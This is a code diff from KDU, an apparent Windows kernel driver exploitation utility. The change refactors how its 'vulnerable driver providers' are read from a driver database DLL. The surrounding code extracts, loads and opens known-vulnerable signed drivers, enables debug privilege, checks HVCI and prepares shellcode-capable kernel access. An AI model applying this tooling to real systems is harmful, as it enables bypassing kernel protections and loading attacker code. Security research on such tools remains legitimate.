@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.27
 *
-*  DATE:        08 Nov 2022
+*  DATE:        11 Nov 2022
 *
 *  Vulnerable drivers provider abstraction layer.
 *
@@ -36,6 +36,24 @@
 #include "idrv/marvinhw.h"
 #include "idrv/zemana.h"
 #include "kduplist.h"
+
+PKDU_DB gProvTable = NULL;
+
+PKDU_DB_ENTRY KDUProviderToDbEntry(
+    _In_ ULONG ProviderId)
+{
+    if (gProvTable == NULL)
+        return NULL;
+
+    ULONG i;
+
+    for (i = 0; i < gProvTable->NumberOfEntries; i++) {
+        if (gProvTable->Entries[i].ProviderId == ProviderId)
+            return &gProvTable->Entries[i];
+    }
+
+    return NULL;
+}
 
 /*
 * KDUFirmwareToString
@@ -73,16 +91,16 @@ ULONG KDUProvGetCount()
 }
 
 /*
-* KDUProvGetReference
+* KDUReferenceLoadDB
 *
 * Purpose:
 *
-* Return pointer to KDU providers list.
+* Return pointer to KDU database.
 *
 */
-PKDU_PROVIDER KDUProvGetReference()
+PKDU_DB KDUReferenceLoadDB()
 {
-    return g_KDUProviders;
+    return gProvTable;
 }
 
 /*
@@ -95,63 +113,69 @@ PKDU_PROVIDER KDUProvGetReference()
 */
 VOID KDUProvList()
 {
-    KDU_PROVIDER* prov;
+    KDU_DB_ENTRY* provData;
     CONST CHAR* pszDesc;
-    ULONG provCount = KDUProvGetCount();
+
+    HINSTANCE hProv;
 
     FUNCTION_ENTER_MSG(__FUNCTION__);
 
-    for (ULONG i = 0; i < provCount; i++) {
-        prov = &g_KDUProviders[i];
+    hProv = KDUProviderLoadDB();
+    if (hProv == NULL)
+        return;
 
-        printf_s("Provider # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
-            i,
-            prov->Desciption,
-            prov->DriverName,
-            prov->DeviceName);
+    for (ULONG i = 0; i < gProvTable->NumberOfEntries; i++) {
+        provData = &gProvTable->Entries[i];
+
+        printf_s("Provider # %lu, ResourceId # %lu\r\n\t%ws, DriverName \"%ws\", DeviceName \"%ws\"\r\n",
+            provData->ProviderId,
+            provData->ResourceId,
+            provData->Desciption,
+            provData->DriverName,
+            provData->DeviceName);
 
         //
         // Show signer.
         //
         printf_s("\tSigned by: \"%ws\"\r\n",
-            prov->SignerName);
+            provData->SignerName);
 
         //
         // Shellcode support
         //
-        printf_s("\tShellcode support mask: 0x%08x\r\n", prov->SupportedShellFlags);
+        printf_s("\tShellcode support mask: 0x%08x\r\n", provData->SupportedShellFlags);
 
         //
         // List provider flags.
         //
-        if (prov->SignatureWHQL)
+        if (provData->SignatureWHQL)
             printf_s("\tDriver is WHQL signed\r\n");
         //
         // Some Realtek drivers are digitally signed 
         // after binary modification with wrong PE checksum as result.
         // Note: Windows 7 will not allow their load.
         //
-        if (prov->IgnoreChecksum)
+        if (provData->IgnoreChecksum)
             printf_s("\tIgnore invalid image checksum\r\n");
 
         //
         // Some BIOS flashing drivers does not support unload.
         //
-        if (prov->NoUnloadSupported)
+        if (provData->NoUnloadSupported)
             printf_s("\tDriver does not support unload procedure\r\n");
 
-        if (prov->PML4FromLowStub)
+        if (provData->PML4FromLowStub)
             printf_s("\tVirtual to physical addresses translation require PML4 query from low stub\r\n");
 
-        if (prov->NoVictim)
+        if (provData->NoVictim)
             printf_s("\tNo victim required\r\n");
 
         //
         // List "based" flags.
         //
-        if (prov->DrvSourceBase != SourceBaseNone)
+        if (provData->DrvSourceBase != SourceBaseNone)
         {
-            switch (prov->DrvSourceBase) {
+            switch (provData->DrvSourceBase) {
             case SourceBaseWinIo:
                 pszDesc = WINIO_BASE_DESC;
                 break;
@@ -176,17 +200,17 @@ VOID KDUProvList()
         // Minimum support Windows build.
         //
         printf_s("\tMinimum supported Windows build: %lu\r\n",
-            prov->MinNtBuildNumberSupport);
+            provData->MinNtBuildNumberSupport);
 
         //
         // Maximum support Windows build.
         //
-        if (prov->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
+        if (provData->MaxNtBuildNumberSupport == KDU_MAX_NTBUILDNUMBER) {
             printf_s("\tMaximum Windows build undefined, no restrictions\r\n");
         }
         else {
             printf_s("\tMaximum supported Windows build: %lu\r\n",
-                prov->MaxNtBuildNumberSupport);
+                provData->MaxNtBuildNumberSupport);
         }
 
     }
@@ -208,7 +232,7 @@ BOOL KDUProvExtractVulnerableDriver(
 {
     NTSTATUS ntStatus;
     ULONG    resourceSize = 0, writeBytes;
-    ULONG    uResourceId = Context->Provider->ResourceId;
+    ULONG    uResourceId = Context->Provider->LoadData->ResourceId;
     LPWSTR   lpFullFileName = Context->DriverFileName;
     PBYTE    drvBuffer;
 
@@ -219,7 +243,7 @@ BOOL KDUProvExtractVulnerableDriver(
         Context->ModuleBase,
         &resourceSize,
         PROVIDER_RES_KEY,
-        Context->Provider->IgnoreChecksum ? FALSE : TRUE);
+        Context->Provider->LoadData->IgnoreChecksum ? FALSE : TRUE);
 
     if (drvBuffer == NULL) {
 
@@ -267,7 +291,7 @@ BOOL KDUProvLoadVulnerableDriver(
     NTSTATUS ntStatus;
 
     LPWSTR   lpFullFileName = Context->DriverFileName;
-    LPWSTR   lpDriverName = Context->Provider->DriverName;
+    LPWSTR   lpDriverName = Context->Provider->LoadData->DriverName;
 
 
     if (!KDUProvExtractVulnerableDriver(Context))
@@ -306,7 +330,7 @@ BOOL KDUProvStartVulnerableDriver(
 )
 {
     BOOL     bLoaded = FALSE;
-    LPWSTR   lpDeviceName = Context->Provider->DeviceName;
+    LPWSTR   lpDeviceName = Context->Provider->LoadData->DeviceName;
 
     //
     // Check if driver already loaded.
@@ -359,7 +383,7 @@ void KDUProvOpenVulnerableDriverAndRunCallbacks(
         Context->Provider->Callbacks.PreOpenDriver((PVOID)Context);
     }
 
-    NTSTATUS ntStatus = supOpenDriver(Context->Provider->DeviceName,
+    NTSTATUS ntStatus = supOpenDriver(Context->Provider->LoadData->DeviceName,
         WRITE_DAC | GENERIC_WRITE | GENERIC_READ,
         &deviceHandle);
 
@@ -372,8 +396,8 @@ void KDUProvOpenVulnerableDriverAndRunCallbacks(
     else {
 
         supPrintfEvent(kduEventInformation,
-            "[+] Vulnerable driver \"%ws\" opened\r\n",
-            Context->Provider->DriverName);
+            "[+] Driver device \"%ws\" has successfully opened\r\n",
+            Context->Provider->LoadData->DriverName);
 
         Context->DeviceHandle = deviceHandle;
 
@@ -404,7 +428,7 @@ void KDUProvStopVulnerableDriver(
 )
 {
     NTSTATUS ntStatus;
-    LPWSTR lpDriverName = Context->Provider->DriverName;
+    LPWSTR lpDriverName = Context->Provider->LoadData->DriverName;
     LPWSTR lpFullFileName = Context->DriverFileName;
 
     ntStatus = supUnloadDriver(lpDriverName, TRUE);
@@ -451,7 +475,7 @@ BOOL WINAPI KDUProviderPostOpen(
     //
     // Check if we need to forcebly set SD.
     //
-    if (Context->Provider->NoForcedSD == FALSE) {
+    if (Context->Provider->LoadData->NoForcedSD == FALSE) {
 
         //
         // At least make less mess.
@@ -643,9 +667,16 @@ HINSTANCE KDUProviderLoadDB(
     FUNCTION_ENTER_MSG(__FUNCTION__);
 
     SetDllDirectory(NULL);
-    hInstance = LoadLibraryEx(DRV64DLL, NULL, LOAD_LIBRARY_AS_IMAGE_RESOURCE);
+    hInstance = LoadLibraryEx(DRV64DLL, NULL, DONT_RESOLVE_DLL_REFERENCES);
     if (hInstance) {
         printf_s("[+] Drivers database \"%ws\" loaded at 0x%p\r\n", DRV64DLL, hInstance);
+
+        gProvTable = (PKDU_DB)GetProcAddress(hInstance, "gProvTable");
+        if (gProvTable == NULL) {
+            supPrintfEvent(kduEventError, "[!] Providers table not found\r\n");
+            FreeLibrary(hInstance);
+            hInstance = NULL;
+        }
     }
     else {
 
@@ -685,7 +716,7 @@ BOOL KDUProviderVerifyActionType(
         //
         // Check if we can translate.
         //
-        if (Provider->PML4FromLowStub && Provider->Callbacks.VirtualToPhysical == NULL) {
+        if (Provider->LoadData->PML4FromLowStub && Provider->Callbacks.VirtualToPhysical == NULL) {
 
             supPrintfEvent(kduEventError, "[!] Abort: selected provider does not support memory translation or\r\n"\
                 "\tKDU interface is not implemented for these methods.\r\n");
@@ -819,6 +850,7 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
 {
     HINSTANCE moduleBase;
     KDU_CONTEXT* Context = NULL;
+    KDU_DB_ENTRY* provLoadData = NULL;
     KDU_PROVIDER* prov;
     NTSTATUS ntStatus;
 
@@ -831,13 +863,29 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
         if (ProviderId >= KDUProvGetCount())
             ProviderId = KDU_PROVIDER_DEFAULT;
 
+        //
+        // Load drivers DB.
+        //
+        moduleBase = KDUProviderLoadDB();
+        if (moduleBase == NULL) {
+            break;
+        }
+
+        provLoadData = KDUProviderToDbEntry(ProviderId);
+        if (provLoadData == NULL) {
+            supPrintfEvent(kduEventError,
+                "[!] Requested provider data was not found in database, abort\r\n");
+            break;
+        }
+
         prov = &g_KDUProviders[ProviderId];
+        prov->LoadData = provLoadData;
 
         if (ShellCodeVersion != KDU_SHELLCODE_NONE) {
-            if (!KDUIsSupportedShell(ShellCodeVersion, prov->SupportedShellFlags)) {
+            if (!KDUIsSupportedShell(ShellCodeVersion, provLoadData->SupportedShellFlags)) {
                 supPrintfEvent(kduEventError,
                     "[!] Selected shellcode %lu is not supported by this provider (supported mask: 0x%08x), abort\r\n",
-                    ShellCodeVersion, prov->SupportedShellFlags);
+                    ShellCodeVersion, provLoadData->SupportedShellFlags);
                 break;
             }
         }
@@ -850,8 +898,8 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
 
             supPrintfEvent(kduEventNone, "[+] Firmware type (%s)\r\n",
                 KDUFirmwareToString(fmwType));
-
-            /*if (prov->PML4FromLowStub)
+            /*
+            if (provLoadData->PML4FromLowStub)
                 if (fmwType != FirmwareTypeUefi) {
 
                     supPrintfEvent(kduEventError, "[!] Unsupported PC firmware type for this provider (req: %s, got: %s)\r\n",
@@ -859,20 +907,21 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
                         KDUFirmwareToString(fmwType));
 
                     break;
-                }*/
+                }
+            */
         }
 
         //
         // Show provider info.
         //
         supPrintfEvent(kduEventInformation, "[+] Provider: \"%ws\", Name \"%ws\"\r\n",
-            prov->Desciption,
-            prov->DriverName);
+            provLoadData->Desciption,
+            provLoadData->DriverName);
 
         //
         // Check HVCI support.
         //
-        if (HvciEnabled && prov->SupportHVCI == 0) {
+        if (HvciEnabled && provLoadData->SupportHVCI == 0) {
 
             supPrintfEvent(kduEventError,
                 "[!] Abort: selected provider does not support HVCI\r\n");
@@ -884,7 +933,7 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
         // Check current Windows NT build number.
         //
 
-        if (NtBuildNumber < prov->MinNtBuildNumberSupport) {
+        if (NtBuildNumber < provLoadData->MinNtBuildNumberSupport) {
 
             supPrintfEvent(kduEventError,
                 "[!] Abort: selected provider require newer Windows NT version\r\n");
@@ -896,8 +945,8 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
         // Let it burn if they want.
         //
 
-        if (prov->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
-            if (NtBuildNumber > prov->MaxNtBuildNumberSupport) {
+        if (provLoadData->MaxNtBuildNumberSupport != KDU_MAX_NTBUILDNUMBER) {
+            if (NtBuildNumber > provLoadData->MaxNtBuildNumberSupport) {
 
                 supPrintfEvent(kduEventError,
                     "[!] Warning: selected provider may not work on this Windows NT version\r\n");
@@ -907,14 +956,6 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
 
         if (!KDUProviderVerifyActionType(prov, ActionType))
             break;
-
-        //
-        // Load drivers DB.
-        //
-        moduleBase = KDUProviderLoadDB();
-        if (moduleBase == NULL) {
-            break;
-        }
 
         ntStatus = supEnablePrivilege(SE_DEBUG_PRIVILEGE, TRUE);
         if (!NT_SUCCESS(ntStatus)) {
@@ -946,9 +987,9 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
             break;
         }
 
-        Context->Provider = &g_KDUProviders[ProviderId];
+        Context->Provider = prov;
 
-        if (Context->Provider->NoVictim) {
+        if (provLoadData->NoVictim) {
             Context->Victim = NULL;
         }
         else {
@@ -957,7 +998,7 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
 
         PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
         SIZE_T length = 64 +
-            (_strlen(Context->Provider->DriverName) * sizeof(WCHAR)) +
+            (_strlen(provLoadData->DriverName) * sizeof(WCHAR)) +
             CurrentDirectory->Length;
 
         Context->DriverFileName = (LPWSTR)supHeapAlloc(length);
@@ -982,7 +1023,7 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
                 length);
 
             _strcat(Context->DriverFileName, TEXT("\\"));
-            _strcat(Context->DriverFileName, Context->Provider->DriverName);
+            _strcat(Context->DriverFileName, provLoadData->DriverName);
             _strcat(Context->DriverFileName, TEXT(".sys"));
 
             if (Context->Provider->Callbacks.StartVulnerableDriver(Context)) {
@@ -996,11 +1037,11 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
 
                     PVOID regParam;
 
-                    if (Context->Provider->NoVictim) {
+                    if (provLoadData->NoVictim) {
                         regParam = (PVOID)Context;
                     }
                     else {
-                        regParam = UlongToPtr(Context->Provider->ResourceId);
+                        regParam = UlongToPtr(provLoadData->ResourceId);
                     }
 
                     if (!Context->Provider->Callbacks.RegisterDriver(
@@ -1066,7 +1107,7 @@ VOID WINAPI KDUProviderRelease(
                 Context->DeviceHandle = NULL;
             }
 
-            if (Context->Provider->NoUnloadSupported) {
+            if (Context->Provider->LoadData->NoUnloadSupported) {
                 supPrintfEvent(kduEventInformation,
                     "[~] This driver does not support unload procedure, reboot PC to get rid of it\r\n");
             }
